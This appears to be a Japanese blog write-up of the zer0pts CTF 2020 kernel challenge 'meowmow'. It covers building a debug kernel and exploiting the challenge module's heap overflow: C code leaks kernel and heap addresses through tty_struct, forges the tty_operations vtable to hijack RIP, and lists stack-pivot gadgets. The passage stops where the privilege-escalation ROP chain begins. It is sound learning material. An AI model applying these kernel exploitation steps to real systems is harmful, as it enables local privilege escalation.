@@ -1,0 +1,823 @@
+<p> </p>
+<p>
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script>
+</p>
+<style><!--
+li.L0, li.L1, li.L2, li.L3,
+li.L5, li.L6, li.L7, li.L8 {
+  list-style-type: decimal !important;
+}
+    li.L1,
+    li.L3,
+    li.L5,
+    li.L7,
+    li.L9 { background: #303030 }
+--></style>
+<p> </p>
+<p>[:contents]</p>
+<p> </p>
+<p> </p>
+<h3>0: 参考</h3>
+<p> 【A】pr0cfsさんのwriteup</p>
+<p><iframe class="embed-card embed-webcard" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;" title="The Plight of TTY in the Linux Kernel" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fpr0cf5.github.io%2Fctf%2F2020%2F03%2F09%2Fthe-plight-of-tty-in-the-linux-kernel.html" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html">pr0cf5.github.io</a></cite></p>
+<p>【B】作問者さんのwriteup</p>
+<p><iframe class="embed-card embed-webcard" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;" title="[zer0pts CTF 2020] meowmow - HackMD" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fhackmd.io%2F%40ptr-yudai%2FrJp1TpbBU%C2%A0" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://hackmd.io/@ptr-yudai/rJp1TpbBU ">hackmd.io</a></cite></p>
+<p> </p>
+<p>【C】kernel pwn 全般に関する pr0cfs さんの素晴らしい解説</p>
+<p><iframe class="embed-card embed-webcard" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;" title="pr0cf5/kernel-exploit-practice" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fpr0cf5%2Fkernel-exploit-practice%2Ftree%2Fmaster%2Fbypass-smap" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://github.com/pr0cf5/kernel-exploit-practice/tree/master/bypass-smap">github.com</a></cite></p>
+<p> </p>
+<h3>1: イントロ</h3>
+<p> いつぞや行われた <strong>zer0pts CTF</strong> の <strong>pwn</strong> 問題 <strong>meowmow</strong></p>
+<p> kernel exploit である本問の解き直しをする</p>
+<p>と思ったまま早数ヶ月が経ってしまった</p>
+<p>やっぱりkernel問に慣れていなさすぎて、やるまでに必要なエネルギーが大きくなりすぎてしまう</p>
+<p>結局は、簡単な問題を数こなす内に慣れていくしかないのであろう</p>
+<p>何はともあれ、このCTFのpwnは全部解き直すと決めていたので、コレで完了</p>
+<p> </p>
+<p>尚自分はkernel exploitに関しては未だに右も左もわからない初心者以下のため</p>
+<p>自分用の備忘録も兼ねて</p>
+<p>自分と同じ初心者でも再現できるよう導入から丁寧にメモしていこうと思う</p>
+<p> </p>
+<p>また、本エントリは参考【A】【B】をなぞっているだけであり</p>
+<p>それ以上の新しい知識は一切出てこないことは留意して頂きたい</p>
+<p> </p>
+<h3>2: 準備</h3>
+<h4>配布ファイル</h4>
+<p>配布ファイルは以下の通り</p>
+<p> </p>
+<p>bzImage:</p>
+<p>kernelイメージファイル。 バージョン情報等は以下の通り</p>
+<p>$ uname -a<br />Linux (none) 4.19.98 #2 SMP Wed Feb 5 21:57:51 JST 2020 x86_64 GNU/Linux</p>
+<p> </p>
+<p>rootfs.cpio:</p>
+<p>ファイルシステムのアーカイブファイル</p>
+<p>kernelがブートした後メモリ上にロードされる</p>
+<p> </p>
+<p>start.sh:</p>
+<p>QEMUからkernelを起動する際のオプション等が記述されたファイル</p>
+<p> </p>
+<p>memo.c:</p>
+<p>本問で使用するLKMのソースファイル。シンプル</p>
+<p> </p>
+<h4>デバッグ環境の整備</h4>
+<p> </p>
+<p>kernelは当然strippedされていてデバッグがしにくい</p>
+<p>そのため、自分でkernelを落としてきてデバッグ情報付きでビルドする必要がある(本当に必要かは知らない。debug-infoなしでいける人はいけるのかもしれない)</p>
+<p>それと同時に、ビルドしたkernelに合わせてLKMも自前ビルドする</p>
+<p> </p>
+<h5>kernelのビルド</h5>
+<p>まずはkernelのビルドから</p>
+<pre class="prettyprint linenums">git clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git
+cd ./linux-stable
+git checkout v4.19.98
+make allnoconfig
+make menuconfig
+ # 内容は以下の .config 参照
+make -j16
+cp ./arch/x86/boot/bzImage ~/YOUR_WORK_SPACE
+</pre>
+<p> </p>
+<p>この際の .config ファイルは以下のリポジトリに一例をあげておいた</p>
+<p><iframe class="embed-card embed-webcard" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;" title="smallkirby/kernelpwn" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fsmallkirby%2Fkernelpwn" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://github.com/smallkirby/kernelpwn">github.com</a></cite></p>
+<p> </p>
+<h5>モジュールのビルド</h5>
+<p>続いてLKMをビルドする</p>
+<p>以下のようなMakefileを作っておいてmakeするだけでOK</p>
+<pre class="prettyprint linenums">obj-m += memo.o
+all:
+		make -C /home/wataru/linux-stable/ M=$(PWD)  modules
+		EXTRA_CFLAGS="-g DDEBUG"
+clean:
+		make -C /home/wataru/linux-stable/ M=$(PWD) clean
+</pre>
+<pre class="prettyprint linenums">$ make
+make -C /home/wataru/linux-stable/ M=/home/wataru/Documents/ctf/zer0pts2020/meowmeow/work/build  modules
+make[1]: Entering directory '/home/wataru/linux-stable'
+  Building modules, stage 2.
+  MODPOST 1 modules
+make[1]: Leaving directory '/home/wataru/linux-stable'
+EXTRA_CFLAGS="-g DDEBUG"
+
+$ modinfo ./memo.ko
+filename:       /home/wataru/Documents/ctf/zer0pts2020/meowmeow/work/build/./memo.ko
+description:    zer0pts CTF 2020 meowmow
+author:         ptr-yudai
+license:        GPL
+depends:
+name:           memo
+vermagic:       4.19.98
+</pre>
+<p> </p>
+<h5>ファイルシステムの展開・圧縮</h5>
+<p> 続いてファイルシステムにデバッグ用のディレクトリを作成しておく</p>
+<p>ファイルシステムの展開・圧縮には以下のスクリプトを使用することができる</p>
+<pre class="prettyprint linenums">$ cat ./extract.sh
+#!/bin/sh
+
+sudo rm -r ./extracted
+mkdir extracted
+cd extracted
+cpio -idv &lt; ../rootfs.cpio
+cd ../
+
+$ cat ./compress.sh
+#!/bin/sh
+
+rm ./myrootfs.cpio
+cd ./extracted
+find ./ -print0 | cpio --owner root --null -o --format=newc &gt; ../myrootfs.cpio
+cd ../
+</pre>
+<p> </p>
+<p>ついでにファイルシステム中の init ファイルもデバッグしやすいように書き換えておく</p>
+<pre class="prettyprint linenums">$ cat ./extracted/init
+#!/bin/sh
+# devtmpfs does not get automounted for initramfs
+/bin/mount -t proc proc /proc
+/bin/mount -t sysfs sysfs /sys
+/bin/mount -t devtmpfs devtmpfs /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+#echo 1 &gt; /proc/sys/kernel/kptr_restrict
+#echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+echo 0 &gt; /proc/sys/kernel/kptr_restrict
+echo 0 &gt; /proc/sys/kernel/dmesg_restrict
+
+chown root:root /flag
+chmod 400 /flag
+insmod /root/memo.ko
+mknod -m 666 /dev/memo c `grep memo /proc/devices | awk '{print $1;}'` 0
+
+echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
+cat /root/banner
+
+#setsid /bin/cttyhack setuidgid 1000 /bin/sh
+setsid /bin/cttyhack setuidgid 0 /bin/sh
+
+umount /proc
+umount /sys
+poweroff -d 0 -f
+</pre>
+<p> </p>
+<p> それから、自前で用意したdebug-info付きのkernelやモジュール等を使用するように起動スクリプトも書き換えておく</p>
+<pre class="prettyprint linenums">$ cat ./start.sh
+#!/bin/sh
+qemu-system-x86_64 \
+    -m 256M \
+    -kernel ./pure/bzImage \
+    -initrd ./myrootfs.cpio \
+    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
+    -cpu kvm64,+smep,+smap \
+    -monitor /dev/null \
+    -nographic -enable-kvm \
+    -s
+</pre>
+<p> </p>
+<p> ここまでできたら一度kernelを起動して、正常に作動すること(LKMがインストールされていること)を確認する</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="動作確認">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200722/20200722213437.png" alt="f:id:smallkirby:20200722213437p:plain" title="f:id:smallkirby:20200722213437p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">動作確認</figcaption>
+</figure>
+<p> </p>
+<h5>GDBでアタッチ</h5>
+<p>それでは最後にGDBでデバッグできる状態にする</p>
+<p>既に起動スクリプトの中でQEMUを -s オプション付きで起動しているため、localhostの1234ポートに接続することでデバッガをアタッチできる</p>
+<p>尚、GDBの起動は上でビルドした対象の Kernel Tree の中で行い、そのトップディレクトリに自前ビルドしたモジュール(.ko)も置いておく</p>
+<p>そうすると、Kernelが提供するGDBスクリプトによって lx-symbols コマンドが使えるようになる</p>
+<pre class="prettyprint linenums">$ pwd
+/home/wataru/linux-stable
+$ ls | grep memo
+-rw-rw-r--   1 wataru wataru    212544 Jul 22 21:31 memo.ko
+$ pwndbg ./vmlinux
+pwndbg&gt; target remote :1234
+pwndbg&gt; lx-symbols
+loading vmlinux
+scanning for modules in /home/wataru/linux-stable
+loading @0xffffffffa0000000: /home/wataru/linux-stable/memo.ko
+pwndbg&gt; b mod_open
+Breakpoint 1 at 0xffffffffa0000140: mod_open. (2 locations)
+</pre>
+<p>すると、以下のようにいつもどおりのデバッグができるようになる</p>
+<p>尚、デバッグ環境を整えるためにはkernelのビルド時に諸々の設定をする必要があるため、これも上に挙げたリポジトリのファイルを参照のこと</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="ユーザランドと同様にデバッグできているの巻">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200722/20200722214245.png" alt="f:id:smallkirby:20200722214245p:plain" title="f:id:smallkirby:20200722214245p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">ユーザランドと同様にデバッグできているの巻</figcaption>
+</figure>
+<p> </p>
+<h5>おまけ</h5>
+<p>配布された bzImage を展開して何かを調べたい場合には以下の通り</p>
+<p><iframe class="embed-card embed-webcard" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;" title="torvalds/linux" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fblob%2Fmaster%2Fscripts%2Fextract-vmlinux" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">github.com</a></cite></p>
+<p> </p>
+<p>vanila gdb ではなく何らかの plugin (今回の場合pwndbg/peda) を使用した場合、デバッグ時に何かしら不都合が出てくる可能性もあるらしい (今回は何も困らなかった)</p>
+<p> </p>
+<p> </p>
+<h3>3.Bugs</h3>
+<p>カーネルモジュールのソースコードを見ると、明らかな heap overflowがある</p>
+<p> </p>
+<p> </p>
+<p>これを利用して heap 領域にある kernel symbol を leak する</p>
+<p>以下の記事に kernel pwn で使える構造体がまとまっている</p>
+<p><iframe class="embed-card embed-blogcard" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;" title="Kernel Exploitで使える構造体集 - CTFするぞ" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F03%2F16%2F165628" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#timerfd_ctx">ptr-yudai.hatenablog.com</a></cite></p>
+<p> </p>
+<p>隣接するバッファの値しか読み書きできないという都合上、選択する構造体は「任意のタイミングでallocすることができる」必要がある</p>
+<p>また、モジュールが作るバッファのサイズは 0x400 であるため、スラブとして kmalloc-1024 が使われる</p>
+<p>よって今回はサイズ0x2e4で同様に kmalloc-1024 が使われる tty_struct を利用することにする</p>
+<p>この構造体は /dev/ptmx を open() すると alloc される</p>
+<p>struct tty_struct のメンバとサイズ・オフセットは以下のとおりである</p>
+<pre class="prettyprint linenums">pwndbg&gt; ptype /o struct tty_struct
+/* offset    |  size */  type = struct tty_struct {
+/*    0      |     4 */    int magic;
+/*    4      |     4 */    struct kref {
+/*    4      |     4 */        refcount_t refcount;
+
+                               /* total size (bytes):    4 */
+                           } kref;
+/*    8      |     8 */    struct device *dev;
+/*   16      |     8 */    struct tty_driver *driver;
+/*   24      |     8 */    const struct tty_operations *ops;
+/*   32      |     4 */    int index;
+/* XXX  4-byte hole  */
+/*   40      |    48 */    struct ld_semaphore {
+/*   40      |     8 */        atomic_long_t count;
+/*   48      |     0 */        raw_spinlock_t wait_lock;
+/*   48      |     4 */        unsigned int wait_readers;
+/* XXX  4-byte hole  */
+/*   56      |    16 */        struct list_head {
+/*   56      |     8 */            struct list_head *next;
+/*   64      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } read_wait;
+/*   72      |    16 */        struct list_head {
+/*   72      |     8 */            struct list_head *next;
+/*   80      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } write_wait;
+
+                               /* total size (bytes):   48 */
+                           } ldisc_sem;
+/*   88      |     8 */    struct tty_ldisc *ldisc;
+/*   96      |    24 */    struct mutex {
+/*   96      |     8 */        atomic_long_t owner;
+/*  104      |     0 */        spinlock_t wait_lock;
+/*  104      |    16 */        struct list_head {
+/*  104      |     8 */            struct list_head *next;
+/*  112      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } wait_list;
+
+                               /* total size (bytes):   24 */
+                           } atomic_write_lock;
+/*  120      |    24 */    struct mutex {
+/*  120      |     8 */        atomic_long_t owner;
+/*  128      |     0 */        spinlock_t wait_lock;
+/*  128      |    16 */        struct list_head {
+/*  128      |     8 */            struct list_head *next;
+/*  136      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } wait_list;
+
+                               /* total size (bytes):   24 */
+                           } legacy_mutex;
+/*  144      |    24 */    struct mutex {
+/*  144      |     8 */        atomic_long_t owner;
+/*  152      |     0 */        spinlock_t wait_lock;
+/*  152      |    16 */        struct list_head {
+/*  152      |     8 */            struct list_head *next;
+/*  160      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } wait_list;
+
+                               /* total size (bytes):   24 */
+                           } throttle_mutex;
+/*  168      |    24 */    struct rw_semaphore {
+/*  168      |     8 */        atomic_long_t count;
+/*  176      |    16 */        struct list_head {
+/*  176      |     8 */            struct list_head *next;
+/*  184      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } wait_list;
+/*  192      |     0 */        raw_spinlock_t wait_lock;
+
+                               /* total size (bytes):   24 */
+                           } termios_rwsem;
+/*  192      |    24 */    struct mutex {
+/*  192      |     8 */        atomic_long_t owner;
+/*  200      |     0 */        spinlock_t wait_lock;
+/*  200      |    16 */        struct list_head {
+/*  200      |     8 */            struct list_head *next;
+/*  208      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } wait_list;
+
+                               /* total size (bytes):   24 */
+                           } winsize_mutex;
+/*  216      |     0 */    spinlock_t ctrl_lock;
+/*  216      |     0 */    spinlock_t flow_lock;
+/*  216      |    44 */    struct ktermios {
+/*  216      |     4 */        tcflag_t c_iflag;
+/*  220      |     4 */        tcflag_t c_oflag;
+/*  224      |     4 */        tcflag_t c_cflag;
+/*  228      |     4 */        tcflag_t c_lflag;
+/*  232      |     1 */        cc_t c_line;
+/*  233      |    19 */        cc_t c_cc[19];
+/*  252      |     4 */        speed_t c_ispeed;
+/*  256      |     4 */        speed_t c_ospeed;
+
+                               /* total size (bytes):   44 */
+                           } termios;
+/*  260      |    44 */    struct ktermios {
+/*  260      |     4 */        tcflag_t c_iflag;
+/*  264      |     4 */        tcflag_t c_oflag;
+/*  268      |     4 */        tcflag_t c_cflag;
+/*  272      |     4 */        tcflag_t c_lflag;
+/*  276      |     1 */        cc_t c_line;
+/*  277      |    19 */        cc_t c_cc[19];
+/*  296      |     4 */        speed_t c_ispeed;
+/*  300      |     4 */        speed_t c_ospeed;
+
+                               /* total size (bytes):   44 */
+                           } termios_locked;
+/*  304      |     8 */    struct termiox *termiox;
+/*  312      |    64 */    char name[64];
+/*  376      |     8 */    struct pid *pgrp;
+/*  384      |     8 */    struct pid *session;
+/*  392      |     8 */    unsigned long flags;
+/*  400      |     4 */    int count;
+/*  404      |     8 */    struct winsize {
+/*  404      |     2 */        unsigned short ws_row;
+/*  406      |     2 */        unsigned short ws_col;
+/*  408      |     2 */        unsigned short ws_xpixel;
+/*  410      |     2 */        unsigned short ws_ypixel;
+
+                               /* total size (bytes):    8 */
+                           } winsize;
+/*  412: 0   |     8 */    unsigned long stopped : 1;
+/*  412: 1   |     8 */    unsigned long flow_stopped : 1;
+/* XXX  6-bit hole   */
+/* XXX  3-byte hole  */
+/*  416: 0   |     8 */    unsigned long unused : 62;
+/* XXX  2-bit hole   */
+/*  424      |     4 */    int hw_stopped;
+/*  428: 0   |     8 */    unsigned long ctrl_status : 8;
+/*  429: 0   |     8 */    unsigned long packet : 1;
+/* XXX  7-bit hole   */
+/* XXX  2-byte hole  */
+/*  432: 0   |     8 */    unsigned long unused_ctrl : 55;
+/* XXX  1-bit hole   */
+/* XXX  1-byte hole  */
+/*  440      |     4 */    unsigned int receive_room;
+/*  444      |     4 */    int flow_change;
+/*  448      |     8 */    struct tty_struct *link;
+/*  456      |     8 */    struct fasync_struct *fasync;
+/*  464      |    16 */    wait_queue_head_t write_wait;
+/*  480      |    16 */    wait_queue_head_t read_wait;
+/*  496      |    32 */    struct work_struct {
+/*  496      |     8 */        atomic_long_t data;
+/*  504      |    16 */        struct list_head {
+/*  504      |     8 */            struct list_head *next;
+/*  512      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } entry;
+/*  520      |     8 */        work_func_t func;
+
+                               /* total size (bytes):   32 */
+                           } hangup_work;
+/*  528      |     8 */    void *disc_data;
+/*  536      |     8 */    void *driver_data;
+/*  544      |     0 */    spinlock_t files_lock;
+/*  544      |    16 */    struct list_head {
+/*  544      |     8 */        struct list_head *next;
+/*  552      |     8 */        struct list_head *prev;
+
+                               /* total size (bytes):   16 */
+                           } tty_files;
+/*  560      |     4 */    int closing;
+/* XXX  4-byte hole  */
+/*  568      |     8 */    unsigned char *write_buf;
+/*  576      |     4 */    int write_cnt;
+/* XXX  4-byte hole  */
+/*  584      |    32 */    struct work_struct {
+/*  584      |     8 */        atomic_long_t data;
+/*  592      |    16 */        struct list_head {
+/*  592      |     8 */            struct list_head *next;
+/*  600      |     8 */            struct list_head *prev;
+
+                                   /* total size (bytes):   16 */
+                               } entry;
+/*  608      |     8 */        work_func_t func;
+
+                               /* total size (bytes):   32 */
+                           } SAK_work;
+/*  616      |     8 */    struct tty_port *port;
+
+                           /* total size (bytes):  624 */
+                         }
+</pre>
+<p> </p>
+<p>この内、const struct tty_operations *ops; は vtable へのポインタとして kernel symbol を指しているため kernelbase の leak に利用することができる</p>
+<p> </p>
+<p>実際に /dev/ptmx を open したあとで上の構造体を確認してみると以下のようになった</p>
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200722/20200722233232.png" alt="f:id:smallkirby:20200722233232p:plain" title="f:id:smallkirby:20200722233232p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<p>opsは 0xffffffff816191e0 &lt;ptm_unix98_ops&gt; を指している</p>
+<p>この時、kernelbase は以下の通り0xffffffff81000000 であったから、そのオフセットは 0x6191e0であることが分かる</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="kernelbase">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200722/20200722234431.png" alt="f:id:smallkirby:20200722234431p:plain" title="f:id:smallkirby:20200722234431p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">kernelbase</figcaption>
+</figure>
+<p> </p>
+<p> </p>
+<p>一旦以下のスクリプトで kearnelbase/kernelheap の leak が可能であることを確認してみる</p>
+<pre class="prettyprint linenums">#include&lt;stdio.h&gt;<stdio.h>
+#include&lt;stdlib.h&gt;<stdlib.h>
+#include&lt;fcntl.h&gt;<fcntl.h>
+#include&lt;unistd.h&gt;<unistd.h>
+#include&lt;sys/ioctl.h&gt;
+#include&lt;sys/types.h&gt;
+
+#define ulong unsigned long
+
+int main(void)
+{
+  int memo = open("/dev/memo",O_RDWR);
+  int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
+  char buf[0x400];
+  ulong off_ptm_unix98_ops_kernbase = 0x6191e0;
+  ulong kernbase;
+
+  lseek(memo,0x300,SEEK_SET);
+  read(memo,buf,0x400);
+
+  kernbase = *(unsigned long*)(buf + 0x100 + 0x18) - off_ptm_unix98_ops_kernbase;
+  printf("kernbase: %lx\n",kernbase);
+
+  return 0;
+}
+</unistd.h></fcntl.h></stdlib.h></stdio.h></pre>
+<p> </p>
+<p>尚、今回はライブラリが使えないため静的リンクしてファイルシステムに入れておく必要がある(組み込み用とかdiet-libcとかを使ってもいいが、別に今回はローカルでしか試さないからいいや)</p>
+<pre class="prettyprint linenums">$ gcc ./test1.c -o test1 --static
+$ cp ./test1 ./extracted/dbg/
+$ sh ./compress.sh
+</pre>
+<p> </p>
+<p>これを実行すると以下のようになる</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="leak kernelbase">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200722/20200722234617.png" alt="f:id:smallkirby:20200722234617p:plain" title="f:id:smallkirby:20200722234617p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">leak kernelbase</figcaption>
+</figure>
+<p>/proc/kallsyms から調べられる kernbase と leak した kernbase が一致していることから、適切にleakできていることがわかる (root権限でないと /proc/kallsyms が読めないため、initファイルを書き換えてrootログインしている)</p>
+<p> </p>
+<p>同様にして、tty_struct 中の struct ld_semaphore 中の struct list_head 中の struct list_head *next が 自分自身を指していることが上の画像より見てとれる</p>
+<p>これにより、heapbase を leak することができる (offset: 0x438)</p>
+<p> </p>
+<p>以上より、kernbase/heapbase ともに leak できたことになる</p>
+<p> </p>
+<p> </p>
+<h3>4. RIPをとる</h3>
+<p>この後の RIP の取り方にはいくらからあるだろうが、今回は参考【B】に準拠して進めていく (参考【B】では別のアプローチをとっている)</p>
+<p>上に示した方法をwriteにも適用させることで、tty_structを自由に操作することができる </p>
+<p>この tty_struct は  struct tty_operations *ops という vtable へのポインタを保有しており、その vtable(ptm_unix98_ops) は以下のようになっている</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="ptm_unix98_ops">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723164221.png" alt="f:id:smallkirby:20200723164221p:plain" title="f:id:smallkirby:20200723164221p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">ptm_unix98_ops</figcaption>
+</figure>
+<p> この vtable へのポインタを不正に操作し、偽の vtable へ飛ばすことができれば RIP を奪取することができる</p>
+<p>試しに以下のスクリプトで tty_struct.ops -&gt; ioctl に該当するエントリに牛の死骸を挿入してみる</p>
+<p>尚、tty_struct の他のエントリを破壊しないように事前に呼んだメモリに上書きする形でoverwriteしている</p>
+<pre class="prettyprint linenums">#include&lt;stdio.h&gt;<stdio.h>
+#include&lt;stdlib.h&gt;<stdlib.h>
+#include&lt;fcntl.h&gt;<fcntl.h>
+#include&lt;unistd.h&gt;<unistd.h>
+#include&lt;sys/ioctl.h&gt;
+#include&lt;sys/types.h&gt;
+
+#define ulong unsigned long
+
+#define REAL
+#undef REAL
+
+int main(void)
+{
+  int memo = open("/dev/memo",O_RDWR);
+  int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
+  char buf[0x400];
+#ifndef REAL
+  ulong off_ptm_unix98_ops_kernbase = 0x6191e0;
+  ulong off_kernheap = 0x438;
+  ulong gad1 = 0;
+#else
+  ulong off_ptm_unix98_ops_kernbase = 0;
+  ulong off_kernheap = 0x438;
+  ulong gad1 = 0x94d4e3;
+#endif
+  ulong kernbase, kernheap;
+
+  lseek(memo,0x300,SEEK_SET);
+  read(memo,buf,0x400);
+
+  // leak kernbase and kernheap
+  kernbase = *(unsigned long*)(buf + 0x100 + 0x18) - off_ptm_unix98_ops_kernbase;
+  printf("kernbase: %lx\n",kernbase);
+  kernheap = *(unsigned long*)(buf + 0x100 + 0x38) - off_kernheap;
+  printf("kernheap: %lx\n",kernheap);
+
+  // 
+  //*(unsigned long*)(buf + 0xc*8) = gad1 + kernbase; // fake ioctl entry
+  *(unsigned long*)(buf + 0xc*8) = 0xdeadbeef; // fake ioctl entry
+  *(unsigned long*)(buf + 0x100 + 0x18) = kernheap + 0x300; // fake vtable pointer
+
+  lseek(memo,0x300,SEEK_SET);
+  write(memo,buf,0x400);
+  ioctl(ptmx,0xdeadbeef,0xcafebabe);
+
+  return 0;
+}
+</unistd.h></fcntl.h></stdlib.h></stdio.h></pre>
+<p> これを実行すると、以下の画像のように tty_struct.ops が memo バッファへのポインタに上書きされる</p>
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723202209.png" alt="f:id:smallkirby:20200723202209p:plain" title="f:id:smallkirby:20200723202209p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<p>そしてこの forged vtable を struct tty_operations として読むと以下のようになる</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="forged vtable">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723202301.png" alt="f:id:smallkirby:20200723202301p:plain" title="f:id:smallkirby:20200723202301p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">forged vtable</figcaption>
+</figure>
+<p>これで ptmx に対して ioctl を呼ぶと 0xdeadbeef に RIP が移ることになるため、以下のように kernel は panic する</p>
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723202434.png" alt="f:id:smallkirby:20200723202434p:plain" title="f:id:smallkirby:20200723202434p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<p>これでRIPをとれるようになった</p>
+<p> </p>
+<p> </p>
+<p>但し、この kernel は SMAP/SMEP/KPTI が全て有効になっているため、ただ userland に帰ろうとしてもそれはできない。それぞれの機能を一言でまとめると以下のようになっている</p>
+<p> </p>
+<p>SMEP: 特権モードから userland のコード実行を禁止する</p>
+<p>SMAP: 特権モードから userland へのポインタの dereference を禁止する(userland へのアクセスを禁止する)/ ret2dir(physmap spray)でbypass</p>
+<p>KPTI: 特権モードと非特権モードでページテーブルを分離する。Meltdown への対策として実装された</p>
+<p> </p>
+<p>ここで、配布された kernel image を探すと以下のようなgadgetが見つかる </p>
+<pre class="prettyprint linenums">$ ~/snipet/kernel/extract-vmlinux ./bzImage  &gt; ./extracted_bzImage
+$rp++ -f ./extracted_bzImage --unique -r 10 | grep "push r12" | grep "pop rsp"
+0xffffffff8194d4e3: push r12 ; add dword [rbp+0x41], ebx ; pop rsp ; pop r13 ; ret  ;  (1 found)
+</pre>
+<p> </p>
+<p>すなわち、このgadgetをR12を任意の値にして呼ぶことができれば RSP を任意の値にセットすることができる </p>
+<p>また、ioctl() を呼ぶ時、tty_ioctl() の以下の箇所でその第2引数が r12 にセットされる</p>
+<p><a href="https://elixir.bootlin.com/linux/v4.19.98/source/drivers/tty/tty_io.c#L2542">https://elixir.bootlin.com/linux/v4.19.98/source/drivers/tty/tty_io.c#L2542</a></p>
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723203310.png" alt="f:id:smallkirby:20200723203310p:plain" title="f:id:smallkirby:20200723203310p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<p> </p>
+<p>すなわち、vtable の ioctl を上の gadget に書き換えた状態で ioctl() を呼ぶと、R12経由でRSP を任意の値にすることができる</p>
+<p>(なお、自前ビルドしたkernelにおいては対象のgadgetは見つからなかった。ビルドコンフィグが違うから当たり前)</p>
+<p> </p>
+<p>ということで実際の kernel image に即してオフセットを調べていっても良いのだが、それでは本家様のコードを丸パクリしてしまうことになってつまらないため、このまま自前ビルドのkernelを使っていくことにする</p>
+<p>上の画像を見ると、RDX には第3引数の値が入っているため、代わりに以下のgadgetが使えそうだった</p>
+<pre class="prettyprint linenums">0xffffffff810243b8: push rdx ; pop rsp ; sub eax, 0x0002E5AC ; pop rax ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret  ;  (1 found)
+</pre>
+<p> </p>
+<p> その後ろで色々と pop しているが、ROPの中にダミーの値を入れておけば、まあ大丈夫だろう</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<h3>5. 定石のROP</h3>
+<p>RIP/RSPを自由に操作することができたらあとは定石の通り ROP を組むだけである</p>
+<p>ROP中で行うことは以下の通り</p>
+<p> </p>
+<h5>prepare_kernel_cred() で init task の cred を入手</h5>
+<p>struct cred *prepare_kernel_cred(struct task_struct *daemon) は以下で定義される関数である</p>
+<p><a href="https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L679">https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L679</a></p>
+<p> </p>
